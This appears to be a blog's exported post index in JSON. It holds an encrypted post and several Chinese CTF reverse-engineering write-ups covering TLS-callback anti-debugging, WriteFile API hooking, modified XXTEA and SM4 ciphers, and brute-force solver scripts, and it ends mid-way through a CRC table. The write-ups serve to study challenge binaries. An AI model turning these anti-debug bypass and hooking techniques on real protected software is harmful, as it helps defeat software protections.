ea0c5b2e8b418892750201f94436b76f4bdeff4779fcd5d085f53edca6ccf0705c6b6cb0e5a5cac21fb522dc578cf2b53b180d821ff395a8eb795eed643421dd88c9cb41b9134ceb17d5345711e059debf82c073d9ccac0294f3538aea78725673b90b41e43c81660afe6c587f318bbb96bbbb07f3f2e89e9ed9843dfb1ca14f5ae40a19217d18235c93d2a360dc9f8d8c6838b6e1910e801fefd860ecfb32f93ae9944bc712c0d6d59609082eeb05200119df157d1d851d6c2044794e96b6d4bceffde28a9eb2d9172d9a48de96c7f02b5d41c0c9e519ce266ee18c251e18d4b5753ce86f3c0cbfd5abb06205cf4e31543fbed7f0f9ad99141d074a31c65e13a385cf2faac4883ded83f66a2e394c8750a276a84ecdf2608900949345a4769ccc2524481669fafe9aed894ea6bf2d19ffdf304a02f82534858d3a8e610621dd74b1a0c168d666a395e369393f008dcc31f2b89b7b08a23003e1efd463d54544d7b9a209acc853e7c47f6dcf88bff1b117736736430d2f8532393249cbd2a8e66b8a9724029cda6f87576592fdd2b65886ba9d4912591e21a798c8ab16c56851914e3bc724f88aa4b1ba6ece17870537a85118f9d6b52c3e8a1fda03f5d824ee9104e0e20dcbeac6ed6a4680f62008e71e7945bca2ddf87410e00916ae1cae952744e2ae86430f7900741c4a693efa62ddf959503d56e064d2b440f04459125872c1e3539ab39c4dacc320bc95ee639ccda171c0f317e69d54ca64deda50da97cb9f016bce8d1b61a5a9003a0526b50f2fb16a64a98d2665bd0abda1d5f8b59b05d8e9ba87e6b9f122890cd6199f4a3d737b71ba9ca56420705e8445c61a803ba5e196ae9b5aa1c4eebeb37e68a64c92b85b3a9c6d8616999506ec6e66a6f2d422da6d5a577eb33081715d7d5278fb1be4f241b37e37409006855b7d7b30a8d47bd1868299f38c9f81d874777c5ebedfc948557033d2347cdb86b1baf80e415e4f43ab6249afded372f5511a9c2793c6c8a4c7e665e40fb0c05b6151db37b42c3b929f416256644c0b37976cfb88c3f03dfdc54515cfa000791718d755d3ba24b1a05e467cfdef17a6da58d9f6300d29d4a755b5ed86e23d5df56b421c5abfc373fe62b9dfa9801d5a4c28fa4eeced97122aeea7e4ae50ca6fc6c299ab469cf0ebeddd6e9892cf81bff114a05d3ed03a9737d506e055c414c77ef02755fce4f8026afb87fae1b0c1d23cb9d128af81895b0c1686abe626afad94031dbf7010209178bfdd0e61c22ae9ec366d2429f1b2f7e63ca85c940abf1cb3a8da037e6b8e691420d73260f0516f9c27a4deb047711d6ef81c55bbaa89d860e313c221407da20576c384419aed7217c7c55524d057e66b84a2481528a94191048f11aa3f82d5776012f8ff4dcb9ef438ed82f2d9059e447c470340d29fc6ae2fecd59a406117d89603e416d20a4e05e25aeede9917c74003ff5e3a85ab1a99cb103fda1391f5d6e75fb2fc54133a0adcc98c89b491fdc9263d9598c9e84ecf9e2ac25896e31302dd65838c88f161abfbfa0966db248ccfd3a8d43b9ad09e76133d2e4917afd808985003216c5524085bc467e551c1e99cadb259f3ef0f9c2c47d21eaa766c45739be7ce21f9ea1ffda1d6e50c753030b08205f130eb9237c1d404844365f7e2dc0258ba96685fe38c5f5f1ec0f5af8abe0f6ce4b996a61d992a43515181623bdd64d8e34fa1d6322a76aa20a8e0d6b213c7216b733f1b73a1137f4df09c3ee3514b7303d9feee779a2b35169a7a5071fd95375ff808b54abdbfe6a0b6945cc8c1a4bfd4d42e8f3e45b4150f1f45a472007b4570975e451d0a5423a1d02f156dd3b0958e59256446ad32c3ce9551e09bba5c5f4aeca84872da93d53f1c5412c339c0d02919562a7893b09ea53cd237cb2a360004b0345c96f6eecd5b56f9beb6481d4220411f8801511b5f98e58032a2e26dc37da0117cbb0b18c89a8941d2907998c3918df41a8dc8f077f42a08f936b786674b1782e7e1c372562e8dca7314f616092a9715ff071641cceb05de4442a4b9e6f7b4417fbab8406fba282ffc92f8fe84ca5140c37e4d83004d57ee 您好, 这里需要密码.","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"keywords":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"Hack For Fun","slug":"Hack-for-fun","date":"2022-05-28T16:00:00.000Z","updated":"2022-05-29T16:02:55.741Z","comments":true,"path":"2022/05/29/Hack-for-fun/","link":"","permalink":"http://example.com/2022/05/29/Hack-for-fun/","excerpt":"","text":"开一个新系列，解语。 有一些事情你自己得与自己和解。 没有章程，逻辑混乱，写给以后的自己。 尽人事，听天命，顺气自然。 或许这才是真实的fucking世界，或许你又遭遇到了一次失败，或许你又搞砸了一段感情，或许你又遭遇一次不公。 不要在意别人的目光，做人要有原则，不要把成绩看得太重要，做事尽力就好，剩下的交给天命。 在这个快餐时代，一切都变得急功近利，触碰到利益的事情就会有不公。 你该怎么办，是气馁，是愤懑，还是放弃，再一次看，你一定遇到挫折了吧。 世界上还有爱你的父母，一起的朋友，很多想要做的事情。 就像amazh👴说的 :“不要把成绩看的太重” 接管了社团，好像搞的一团糟，没有这方面的天赋。 失败是暂时的，真正的强者是如何面对失败. 下个星期，期末加油 之前的你已经不在，都停留在岁月里面，过好每一个明天，去成为更好的人类。 打ctf的意义是什么，为了奖项？为了成绩？ 都不是 提升自己才是最初的目的，菜就多学。希望早日成为带佬！！！ 本来还有好多话要说，一时又想不起来 坚持自己的原则，花钱py真的没有必要， ​ -2022 5 30 0.03","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"keywords":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"JIT","slug":"JIT","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-29T13:24:49.962Z","comments":true,"path":"2022/05/28/JIT/","link":"","permalink":"http://example.com/2022/05/28/JIT/","excerpt":"","text":"什么是JITJIT &#x3D; Just In Time即时编译，是动态编译的一种形式，是一种优化虚拟机运行的技术。程序运行通常有两种方式，一种是静态编译，一种是动态解释，即时编译混合了这二者。 lujit运行过程： 解题： 得到一个.out 文件，电脑识别成Wireshark 系列文件，拉入WinHex会发现是.LJ开头，可以推断是Luajit逆向。 先编译LuaJit2.1.0Beta3Download (luajit.org) 去官网下载 运行x64 Native Tools Command Prompt for VS （用Everything搜索）， 然后将下载的安装包解压到相应的盘下，然后进入解压后的SRC文件 msvcbuild.bat gc64编译出的64位（题目的64位 msvcbuild.bat编译出的是32位 反编译bobsayshilol&#x2F;luajit-decomp at deprecated (github.com) 下载反编译工具 然后将上一步src文件夹里面jit文件夹，和lua51.dll luajit.exe 放到刚刚下载的反编译工具文件夹里面 然后将我们的题目附件改名为test.lua，再按下decoder_new.exe该文件就出现了out.lua和out2.lua 用sublime打开，就可以开始分析字节码了 未完待续。。","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-luajit","slug":"luajit","permalink":"http://example.com/tags/luajit/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"TWIN","slug":"TWIN","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-28T14:18:24.673Z","comments":true,"path":"2022/05/28/TWIN/","link":"","permalink":"http://example.com/2022/05/28/TWIN/","excerpt":"","text":"TLS回调函数：TLS(Thread Local Storage, 线程局部存储)回调函数，TLS 回调函数的调用运行要先于 EP 代码的执行，并且每次创建或结束线程都会再次调用，故常用于反调试。 可以在节区表发现IMAGE_TLS_DIRECTORY，找到Address of Callbacks（注意回调函数一般不止一个） 题解： 32位无壳 首先是一个虚假的逻辑验证。 在函数栏搜索找到callback函数，但是$+5,没有直接反编译，找到主要回调函数 这里有一个小花指令，最好retn会跳到sub_4019BF,后面还会有一处 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158void __usercall sub_4019BF(int a1@&lt;ebp&gt;)&#123; void *v1; // eax if ( *(_DWORD *)(a1 + 12) == 1 ) &#123; memset((void *)(a1 - 284), 0, 0x50u); sub_401930((void *)(a1 - 284)); *(_BYTE *)(a1 - 1) = 0; *(_BYTE *)(a1 - 1) = NtCurrentPeb()-&gt;BeingDebugged; if ( !*(_BYTE *)(a1 - 1) ) return; *(_BYTE *)(a1 - 32) = 57; *(_BYTE *)(a1 - 31) = 51; *(_BYTE *)(a1 - 30) = 62; *(_BYTE *)(a1 - 29) = 56; *(_BYTE *)(a1 - 28) = 0; sub_4018C0(a1 - 32); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, (LPCSTR)(a1 - 32)); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); *(_BYTE *)(a1 - 116) = 47; *(_BYTE *)(a1 - 115) = 19; *(_BYTE *)(a1 - 114) = 26; *(_BYTE *)(a1 - 113) = 30; *(_BYTE *)(a1 - 112) = 12; *(_BYTE *)(a1 - 111) = 26; *(_BYTE *)(a1 - 110) = 95; *(_BYTE *)(a1 - 109) = 22; *(_BYTE *)(a1 - 108) = 17; *(_BYTE *)(a1 - 107) = 15; *(_BYTE *)(a1 - 106) = 10; *(_BYTE *)(a1 - 105) = 11; *(_BYTE *)(a1 - 104) = 95; *(_BYTE *)(a1 - 103) = 6; *(_BYTE *)(a1 - 102) = 16; *(_BYTE *)(a1 - 101) = 10; *(_BYTE *)(a1 - 100) = 13; *(_BYTE *)(a1 - 99) = 95; *(_BYTE *)(a1 - 98) = 25; *(_BYTE *)(a1 - 97) = 19; *(_BYTE *)(a1 - 96) = 30; *(_BYTE *)(a1 - 95) = 24; *(_BYTE *)(a1 - 94) = 69; *(_BYTE *)(a1 - 93) = 95; *(_BYTE *)(a1 - 92) = 0; v1 = (void *)sub_4018C0(a1 - 116); sub_401930(v1); *(_BYTE *)(a1 - 8) = 90; *(_BYTE *)(a1 - 7) = 12; *(_BYTE *)(a1 - 6) = 0; sub_4018C0(a1 - 8); sub_401130((char *)(a1 - 8), dword_404448[0]); &#125; if ( !*(_DWORD *)(a1 + 12) ) &#123; *(_BYTE *)(a1 - 24) = 81; *(_BYTE *)(a1 - 23) = 80; *(_BYTE *)(a1 - 22) = 11; *(_BYTE *)(a1 - 21) = 18; *(_BYTE *)(a1 - 20) = 15; *(_BYTE *)(a1 - 19) = 0; sub_4018C0(a1 - 24); sub_401410(); memset((void *)(a1 - 204), 0, 0x44u); *(_DWORD *)(a1 - 204) = 68; CreateProcessA( (LPCSTR)(a1 - 24), 0, 0, 0, 0, 3u, 0, 0, (LPSTARTUPINFOA)(a1 - 204), (LPPROCESS_INFORMATION)(a1 - 136)); *(_BYTE *)(a1 - 44) = 28; *(_BYTE *)(a1 - 43) = 16; *(_BYTE *)(a1 - 42) = 13; *(_BYTE *)(a1 - 41) = 13; *(_BYTE *)(a1 - 40) = 26; *(_BYTE *)(a1 - 39) = 28; *(_BYTE *)(a1 - 38) = 11; *(_BYTE *)(a1 - 37) = 117; *(_BYTE *)(a1 - 36) = 0; *(_BYTE *)(a1 - 16) = 8; *(_BYTE *)(a1 - 15) = 13; *(_BYTE *)(a1 - 14) = 16; *(_BYTE *)(a1 - 13) = 17; *(_BYTE *)(a1 - 12) = 24; *(_BYTE *)(a1 - 11) = 117; *(_BYTE *)(a1 - 10) = 0; *(_BYTE *)(a1 - 88) = 47; *(_BYTE *)(a1 - 87) = 19; *(_BYTE *)(a1 - 86) = 26; *(_BYTE *)(a1 - 85) = 30; *(_BYTE *)(a1 - 84) = 12; *(_BYTE *)(a1 - 83) = 26; *(_BYTE *)(a1 - 82) = 95; *(_BYTE *)(a1 - 81) = 28; *(_BYTE *)(a1 - 80) = 19; *(_BYTE *)(a1 - 79) = 16; *(_BYTE *)(a1 - 78) = 12; *(_BYTE *)(a1 - 77) = 26; *(_BYTE *)(a1 - 76) = 95; *(_BYTE *)(a1 - 75) = 11; *(_BYTE *)(a1 - 74) = 23; *(_BYTE *)(a1 - 73) = 26; *(_BYTE *)(a1 - 72) = 95; *(_BYTE *)(a1 - 71) = 27; *(_BYTE *)(a1 - 70) = 26; *(_BYTE *)(a1 - 69) = 29; *(_BYTE *)(a1 - 68) = 10; *(_BYTE *)(a1 - 67) = 24; *(_BYTE *)(a1 - 66) = 24; *(_BYTE *)(a1 - 65) = 26; *(_BYTE *)(a1 - 64) = 13; *(_BYTE *)(a1 - 63) = 95; *(_BYTE *)(a1 - 62) = 30; *(_BYTE *)(a1 - 61) = 17; *(_BYTE *)(a1 - 60) = 27; *(_BYTE *)(a1 - 59) = 95; *(_BYTE *)(a1 - 58) = 11; *(_BYTE *)(a1 - 57) = 13; *(_BYTE *)(a1 - 56) = 6; *(_BYTE *)(a1 - 55) = 95; *(_BYTE *)(a1 - 54) = 30; *(_BYTE *)(a1 - 53) = 24; *(_BYTE *)(a1 - 52) = 30; *(_BYTE *)(a1 - 51) = 22; *(_BYTE *)(a1 - 50) = 17; *(_BYTE *)(a1 - 49) = 117; *(_BYTE *)(a1 - 48) = 0; sub_401510(a1 - 24, a1 - 136); if ( dword_404440 == 1 ) &#123; sub_4012C0(*(_DWORD *)dword_404448 + 20, 5, &amp;unk_40405C); *(_DWORD *)(a1 - 120) = memcmp((const void *)(*(_DWORD *)dword_404448 + 20), &amp;unk_40402C, 0x14u); if ( !*(_DWORD *)(a1 - 120) ) &#123; sub_4018C0(a1 - 44); sub_401930((void *)(a1 - 44));LABEL_12: CloseHandle(hObject); return; &#125; &#125; else if ( dword_404440 == -2 ) &#123; sub_4018C0(a1 - 88); sub_401930((void *)(a1 - 88)); goto LABEL_12; &#125; sub_4018C0(a1 - 16); sub_401930((void *)(a1 - 16)); goto LABEL_12; &#125;&#125; 这个函数有两大部分 这个a1 + 12就是对应着运行前与退出，对应DLL_PROCESS_ATTACH和DLL_PROCESS_DETACH 所以总结一下！a1 + 12 &#x3D;&#x3D; 1是线程运行之前执行 a1 + 12 &#x3D;&#x3D; 0 是线程退出后运行 首先会遇到一个PEB反调试，我们直接修改ZF标志位绕过。 然后就是一个异或，将原始数据inputflag混肴。 紧接着读取我们的输入， 输入之后F9进入第二部分 获取WriteFile API的地址 将WriteFile API地址改成自写函数的地址（也就是Hook函数） 也就是之后我们调用WriteFile函数地址就会调用Hook函数（Hook函数里执行完Hook代码就会脱钩） GetModuleHandleA得到WiteFile函数的句柄，GetProcAddress函数获取WriteFile函数的地址存入dword_4043DC，并在sub_4016C0中将这个值修改为sub_401650的地址值。 随后在第二个TLS函数会调用ExitProcess()，也就是退出进程，那么退出进程又会调用TLS函数链，于是又回到了第一个TLS函数，不过这次进的是退出线程的函数块，分析主要函数 这里创建了一个文件，也就是tmp文件，但是对名字也进行了混肴,然后往里面写入进程。 我们可以发现这里的writefile变成了我们相要执行的函数 把子进程的两个值改成6，实践上是xxtea在加密过程中的右移轮次。 接下来分析一下tmp文件。 其中 先判断是否被调试，然后对delta进行异或操作。 hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name_FLAG);创建名字为FLAG的文件映射对象，用于进程间通信。*(_DWORD *)input = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u);存了内存映射文件，便于后面的共享内存。简而言之，就是创建一个名为FLAG的文件映射对象，把input指向的地址设置成一块共享的内存，这样就可以在子进程里对input这块内存进行修改，实现加密。 一个魔改的XXTEA加密，z右移5改成了右移6位 这里一处函数需要注意 WaitForDebugEvent表明父进程调用子进程是以调试方式打开，也就是说父进程调试子进程，所以实际上子进程的反调试是不能绕过的，正常执行程序应该会进入子进程的if语句，对key和delta进行一些魔改运算。0xC0000005，这是一个异常代码，代表EXCEPTION_ACCESS_VIOLATION，内存访问异常，也即子进程中触发的异常。 也就是说，子进程被父进程调试，当子进程发生异常，应当交由调试者（父进程）处理。所以当子进程中触发异常，程序就会流回父进程，判断是否为内存访问异常，如果是，就对eip和eax做出相应修改。 再回去看子进程触发异常的地方，eip+5之后正好跳过了会触发异常的地方。而eax里存储的实际上是delta经过一通魔改运算之后的结果。也就是说，delta不仅在子进程里被修改，还会在父进程里异或一次，也就是还原成之前最初的模样 前一半的（修改的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x1c925d64#define MX (((z&gt;&gt;6^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))uint32_t k[4]= &#123;0x12,0x90,0x56,0x78&#125;;void xxtea(uint32_t* v, int n, uint32_t* key)&#123; unsigned int sum,z,p,y; int e, rounds; rounds = 6 + 52/n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds);&#125;int main()&#123; uint32_t v[5] = &#123;0x6b7ce328,0x4841d5dd,0x963784dc,0xef8a3226,0x776b226&#125;; int n = 5; xxtea(v, n, k); int i; for(i=0;i&lt;5;i++) &#123; printf(&quot;%c&quot;,v[i]&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;8&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;16&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;24&amp;0xff); &#125; return 0;&#125; 后面那半就比较好出了，没有改任何Delta数或XXTEA算法 miniLctf{cbda59ff59e3e90c91c02e9b40b78b} 参考：miniL2022 WP 今晚恰烤lq！ - 云之君 (yunzh1jun.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"TLS回调函数","slug":"TLS回调函数","permalink":"http://example.com/tags/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"},{"name":"反调试","slug":"反调试","permalink":"http://example.com/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"异常处理","slug":"异常处理","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"CEF","slug":"cef","date":"2022-05-26T16:00:00.000Z","updated":"2022-05-27T14:31:42.247Z","comments":true,"path":"2022/05/27/cef/","link":"","permalink":"http://example.com/2022/05/27/cef/","excerpt":"","text":"32位无壳程序 CEF简介: 嵌入式Chromium框架(简称CEF) 是一个由Marshall Greenblatt在2008建立的开源项目，它主要目的是开发一个基于Google Chromium的Webbrowser控件。CEF支持一系列的编程语言和操作系统，并且能很容易地整合到新的或已有的工程中去。 解题：正面去分析的话，十分困难。去搜索相应字符串无果 这里我们可以去从数据调用去分析，我们去分析.data的数据 一组奇怪的数据，猜测加密时用到，交叉引用找到调用的地方 调试验证一下，一开始会停在调用的dll函数里面，我们直接步过，然后输入32位之后就会断下F9提示correct，验证我们的猜想是正确的。调试发现其实，加密整个逻辑就在else里面，一个魔改的SM4，其基本运算为异或^和循环左移&lt;&lt;&lt; round函数 解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned int SK[32] = &#123; 0xE8DB227C, 0x012451B9, 0xED08A9DB, 0xC91F65C3, 0xB3D1E981, 0x319B4734, 0xA4BA5551, 0xD0F2ED2D, 0x4A00D692, 0xE0AEFE30, 0x6BBCDB4A, 0xC315F6F1, 0xB4E1B030, 0x694C4ACE, 0x479208D3, 0x3F8C7B97, 0x747777A6, 0xEDEC9BBB, 0xC8E506C1, 0xB955A92A, 0xB388FDBB, 0x1A4697C3, 0xB10826AA, 0xBB1F2207, 0x291DCD60, 0x2BA3E3A7, 0x1B83DFDD, 0x014D4FD5, 0x80C659F3, 0x3EB45B23, 0x43E36266, 0xBD22532C&#125;;#define GET_ULONG(n, b, i) \\ (n) = ( (unsigned long) (b)[(i + 3)] &lt;&lt; 24 ) \\ | ( (unsigned long) (b)[(i + 2)] &lt;&lt; 16 ) \\ | ( (unsigned long) (b)[(i + 1)] &lt;&lt; 8 ) \\ | ( (unsigned long) (b)[(i )] ); \\#define PUT_ULONG(n, b, i) \\&#123; \\ (b)[(i) + 3] = (unsigned char) ( (n) &gt;&gt; 24 ); \\ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 16 ); \\ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 8 ); \\ (b)[(i) ] = (unsigned char) ( (n) ); \\&#125; #define SHL(x, n) ( ((x) &amp; 0xFFFFFFFF) &lt;&lt; n )#define ROTL(x, n) ( SHL((x), n) | ((x) &gt;&gt; (32 - n)) )#define SWAP(a, b) &#123; unsigned t = a; a = b; b = t; t = 0; &#125; void SM4_Decrypt(unsigned char * input, unsigned char * output, int len); void Round(unsigned char input[16], unsigned char output[16]);int main(void)&#123; unsigned char input[] = &#123; 0x7D, 0x54, 0xCB, 0xC0, 0x74, 0xDB, 0xF5, 0xD7, 0x6F, 0xD9, 0x92, 0x1B, 0xEB, 0x28, 0x46, 0x20, 0xE5, 0xD5, 0xD3, 0x60, 0x80, 0x6D, 0x36, 0x2F, 0xB0, 0x63, 0x2F, 0x61, 0x20, 0x0F, 0xA9, 0x30 &#125;; unsigned char output[32] = &#123; 0 &#125;; int i; SM4_Decrypt(input, output, 32); for ( i = 0; i &lt; 32; i++ ) &#123;// printf(&quot;0x%X, &quot;, output[i]); printf(&quot;%c&quot;, output[i]); &#125; return 0;&#125;void SM4_Decrypt(unsigned char * input, unsigned char * output, int len)&#123; int i; for ( i = 0; i &lt; 16; i++ ) SWAP(SK[i], SK[31 - i]); while ( len &gt; 0 ) &#123; Round(input, output); input += 16; output += 16; len -= 16; &#125;&#125;void Round(unsigned char input[16], unsigned char output[16])&#123; unsigned long tmp[4] = &#123; 0 &#125;; int i; unsigned int t = 0; GET_ULONG(tmp[0], input, 0); GET_ULONG(tmp[1], input, 4); GET_ULONG(tmp[2], input, 8); GET_ULONG(tmp[3], input, 12); for ( i = 0; i &lt; 32; i++ ) &#123; t = SK[i] ^ tmp[(i + 1) % 4] ^ tmp[(i + 2) % 4] ^ tmp[(i + 3) % 4]; tmp[i % 4] ^= t ^ ROTL(t, 2) ^ ROTL(t, 24) ^ ROTL(t, 10) ^ ROTL(t, 18); &#125; for ( i = 0 ; i &lt; 4; i++ ) GET_ULONG(SK[26 - i], input, i * 4); // 正好是把加密后的值放入 那么解密的时候就是把密文放入即可 PUT_ULONG(tmp[3], output, 0); PUT_ULONG(tmp[2], output, 4); PUT_ULONG(tmp[1], output, 8); PUT_ULONG(tmp[0], output, 12);&#125; 运行得到 3b2365b04700b5eac3a5fd0ba21b687f 参考：DASCTF2022 X VOID-CEF - P.Z’s Blog (ppppz.net)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-CEF","slug":"CEF","permalink":"http://example.com/tags/CEF/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"WER","slug":"WER","date":"2022-05-25T16:00:00.000Z","updated":"2022-05-26T14:18:22.094Z","comments":true,"path":"2022/05/26/WER/","link":"","permalink":"http://example.com/2022/05/26/WER/","excerpt":"","text":"无壳，64位 什么是WER：Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。 参考：关于 WER - Win32 apps | Microsoft Docs 其关键函数如下： 123DWORD WINAPI ApplicationRecoveryCallback( PVOID pvParameter //上下文信息在调用‎‎注册应用程序恢复回拨‎‎函数以注册恢复时指定。‎); ‎应用程序定义的回调函数，用于在应用程序遇到未处理的异常或无响应时保存数据和应用程序状态信息。 参考：ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs 1234HRESULT WerReportHang( [in] HWND hwndHungApp, //‎处理未响应的窗口。 [in, optional] PCWSTR pwzHungApplicationName //要在挂起的报告 UI 中显示的无响应应用程序的名称。); 返回值‎：‎返回S_OK函数是否能够在失败时启动报告或错误代码。请注意，S_OK并不一定意味着“无响应”报告已成功完成，而只是表示已启动。‎ 参考：WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs 主要运行逻辑为： 1.在初始化注册ApplicationRecoveryCallback函数 2.在OnExit调用WerReportHang触发异常 3.运用ApplicationRecoveryCallback进行真正的逻辑处理。 本题OnExit函数就在main函数里面，调用WerReportHang就会关闭调试器，调试不起来 解题： 搜索关键函数，在import表里面找到，放在了一个dll里面 然后交叉引用找到： 这里的sub_14000F3B0就是我们要找的关键函数 也可以通过MessageBox函数来找。 123data = [ 0x05, 0x03, 0x55, 0x05, 0x04, 0x07, 0x5E, 0x54, 0x05, 0x07, 0x50, 0x02, 0x03, 0x53, 0x5F, 0x50, 0x53, 0x50, 0x53, 0x05, 0x55, 0x00, 0x54, 0x55, 0x57, 0x03, 0x05, 0x02, 0x52, 0x50, 0x51, 0x53]for i in range(len(data)): print(chr(data[i] ^ 102), end = &quot;&quot;) 异或写脚本得到flag","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[wer]","slug":"wer","permalink":"http://example.com/tags/wer/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"末日邀请","slug":"KCTF-末日邀请（加密闯关）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-24T15:49:32.139Z","comments":true,"path":"2022/05/24/KCTF-末日邀请（加密闯关）/","link":"","permalink":"http://example.com/2022/05/24/KCTF-%E6%9C%AB%E6%97%A5%E9%82%80%E8%AF%B7%EF%BC%88%E5%8A%A0%E5%AF%86%E9%97%AF%E5%85%B3%EF%BC%89/","excerpt":"","text":"先是输入flag也就是ID，然后进行check，主要考察算法。 对我们的输入进行一系列异或，最后赋值给v39，注意这里v39类型是char，接着进行sbox数据初始化， 然后进行CRC32验证，这里可以动调取到flag，这里v34的值后面会给出并进行验证。 接着先将字符转成数值，存入内存，并且如果大于58就减去55.接着用冰雹猜想验证输入的前三位。我们可以爆破得到v17的值是定值7.具体前三位先按下不表 爆破代码： 123456789101112131415161718192021222324252627#include &lt;cstring&gt;#include &lt;iostream&gt;using namespace std;int i; // edxint v13; // ecxint v15; // eaxint j; // edxint v17; // ediint v33[200]; // [esp+10h] [ebp-368h]int main()&#123; for (int i = 0; i &lt;= 0xff; i++) &#123; v13 = i; v15 = v13; for (j = 1; j &lt; 200; ++j) &#123; if ((v15 &amp; 1) != 0) // 奇数*3+1 v15 = 3 * v15 + 1; else v15 &gt;&gt;= 1; // 偶数右移1 v33[j] = v15; &#125; v17 = v33[198] | v33[197] | v33[196]; cout &lt;&lt; v17 &lt;&lt; endl; &#125;&#125; 后面就是判断后四位是否为KCTF 动调发现是v41[1]是输入的第8个字符，推测后面还需要验证九位，然后进行取余验证，依次取最高前i位，看是否能取余i，不能则失败。但是后面对这里有一个约束。先是冒泡排序从小到大排序，然后对比19，也就是必须包含19每个数字 爆破取得这九位：381654729 12345for i in range(100000000,1000000000): if i//10000000 %2 == 0 and i//1000000%3 == 0 and i//100000%4 == 0 and i//10000%5 == 0 and i//1000 %6 == 0 and i//100 % 7 == 0 and i//10 % 8 == 0 and i%9 == 0: num_all = str(i) if &quot;1&quot; in num_all and &quot;2&quot; in num_all and &quot;3&quot; in num_all and &quot;4&quot; in num_all and &quot;5&quot; in num_all and &quot;6&quot; in num_all and &quot;7&quot; in num_all and &quot;8&quot; in num_all and &quot;9&quot; in num_all : print(i) 最后就是判断v34是否相等 也就是前三位 爆破得到前三位：421 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; uint32_t magic_arr[] = &#123;0x00000000, 0x09073096, 0x120E612C, 0x1B0951BA, 0xFF6DC419, 0xF66AF48F, 0xED63A535, 0xE46495A3, 0xFEDB8832, 0xF7DCB8A4, 0xECD5E91E, 0xE5D2D988, 0x01B64C2B, 0x08B17CBD, 0x13B82D07, 0x1ABF1D91, 0xFDB71064, 0xF4B020F2, 0xEFB97148, 0xE6BE41DE, 0x02DAD47D, 0x0BDDE4EB, 0x10D4B551, 0x19D385C7, 0x036C9856, 0x0A6BA8C0, 0x1162F97A, 0x1865C9EC, 0xFC015C4F, 0xF5066CD9, 0xEE0F3D63, 0xE7080DF5, 0xFB6E20C8, 0xF269105E, 0xE96041E4, 0xE0677172, 0x0403E4D1, 0x0D04D447, 0x160D85FD, 0x1F0AB56B, 0x05B5A8FA, 0x0CB2986C, 0x17BBC9D6, 0x1EBCF940, 0xFAD86CE3, 0xF3DF5C75, 0xE8D60DCF, 0xE1D13D59, 0x06D930AC, 0x0FDE003A, 0x14D75180, 0x1DD06116, 0xF9B4F4B5, 0xF0B3C423, 0xEBBA9599, 0xE2BDA50F, 0xF802B89E, 0xF1058808, 0xEA0CD9B2, 0xE30BE924, 0x076F7C87, 0x0E684C11, 0x15611DAB, 0x1C662D3D, 0xF6DC4190, 0xFFDB7106, 0xE4D220BC, 0xEDD5102A, 0x09B18589, 0x00B6B51F, 0x1BBFE4A5, 0x12B8D433, 0x0807C9A2, 0x0100F934, 0x1A09A88E, 0x130E9818, 0xF76A0DBB, 0xFE6D3D2D, 0xE5646C97, 